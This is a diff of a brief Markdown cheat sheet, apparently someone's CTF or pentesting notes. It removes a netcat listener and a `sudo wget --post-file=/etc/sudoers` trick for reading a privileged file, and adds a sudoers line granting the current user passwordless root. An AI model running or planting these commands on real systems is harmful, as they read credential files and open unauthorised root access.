@@ -103,9 +103,7 @@
 
 * use common first, before small/...
 * `document.firstChild.nextSibling.innerHTML.match(/<!--.*?-->/g)`
-* `wget -q`
-* `nc -dlnp 4444 -q 0 > /tmp/sudoers &`
-* `sudo wget --post-file=/etc/sudoers localhost:4444`
+* `$(whoami)  ALL=(ALL) NOPASSWD:ALL`
 
 List
 
